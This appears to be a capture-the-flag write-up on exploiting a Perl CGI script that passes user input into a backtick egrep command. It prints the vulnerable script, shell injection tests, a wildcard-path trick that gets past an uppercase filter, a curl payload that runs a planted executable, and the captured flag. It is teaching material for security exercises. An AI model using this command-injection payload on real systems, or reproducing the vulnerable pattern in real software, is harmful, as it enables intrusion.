
# Exploit a substitution command in Perl

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; # Retrieve 2nd arg.
  $xx = $_[0]; # Retrieve 1st arg.
  $xx =~ tr/a-z/A-Z/; # Transform all letters to Uppercase.
  $xx =~ s/\s.*//; # Delete all content after the first whitespacein$xx.
  
	# egrep takes as argument a regex pattern for the file /tmp/xd
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
	# This line is vulnerable, because with a code injection we
	# can place a substitution command.

  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

I started by testing this line, which works successfully

```
egrep "^`echo test > /tmp/test`" /tmp/xd 2>&1
```

Then the idea was to put everything in an environment variable. So I get this:

```
export TEST=”\`echo test > /tmp/test\`”
```
```
`egrep "^$TEST" /tmp/xd 2>&1`
```

Except that the problem is that here, the search **egrep** uses the literal value of the variable **$TEST**. It would have been necessary to make a manipulation with eval to get there.

Let’s go back to the idea of the beginning, but instead of placing a command, let’s put an executable.

Create a **`MAJEXEC`** file, apply a chmod to make it executable.

```bash
getflag > /tmp/token
```

Why do we need a wildcard: `/*/`  ? Simply because if we put the absolute path, it will be put in SHIFT, so invalid.

```bash
curl 'localhost:4646?x="`/*/MAJEXEC`"'
```

> Flag : `g1qKMiRpXf53AWhDaU7FEkczr`
